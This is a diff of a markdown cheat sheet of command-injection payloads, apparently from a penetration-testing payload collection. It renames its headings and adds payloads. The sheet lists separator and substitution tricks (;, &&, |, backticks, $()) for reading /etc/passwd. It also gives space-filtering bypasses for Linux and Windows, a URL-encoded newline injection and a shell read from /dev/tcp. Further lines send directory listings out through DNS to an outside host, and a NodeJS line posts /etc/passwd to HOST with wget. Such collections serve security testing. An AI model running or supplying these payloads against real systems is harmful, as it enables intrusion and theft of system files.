@@ -1,9 +1,9 @@
-# Remote Code Execution
-Remote code execution is a security vulnerability that allows an attacker to execute codes from a remote server.
+# Remote Commands Execution
+Remote Commands execution is a security vulnerability that allows an attacker to execute Commandss from a remote server.
 
 
 ## Exploits
-Normal code execution, execute the command and voila :p
+Normal Commands execution, execute the command and voila :p
 ```
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -12,15 +12,20 @@ bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
 ```
 
-Code execution by chaining commands
+Commands execution by chaining commands
 ```
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
-original_cmd_by_server `ls`
 ```
 
-Code execution without space - Linux
+Commands execution inside a command
+```
+original_cmd_by_server `cat /etc/passwd`
+original_cmd_by_server $(cat /etc/passwd)
+```
+
+Commands execution without space - Linux
 ```
 swissky@crashlab:~/Www$ cat</etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -44,16 +49,21 @@ Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 ```
 
-Code execution without space - Windows
+Commands execution without space - Windows
 ```
 ping%CommonProgramFiles:~10,-18%IP
 ping%PROGRAMFILES:~10,-5%IP
 ```
 
 
-Code execution without spaces, $ or { } - Linux (Bash only)
+Commands execution without spaces, $ or { } - Linux (Bash only)
 ```
 IFS=,;`cat<<<uname,-a`
+```
+
+Commands execution with a line return
+```
+something%0Acat%20/etc/passwd
 ```
 
 ## Time based data exfiltration
@@ -80,7 +90,7 @@ for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
 
 ## Environment based
-NodeJS Code execution
+NodeJS Commands execution
 ```
 require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
 ```
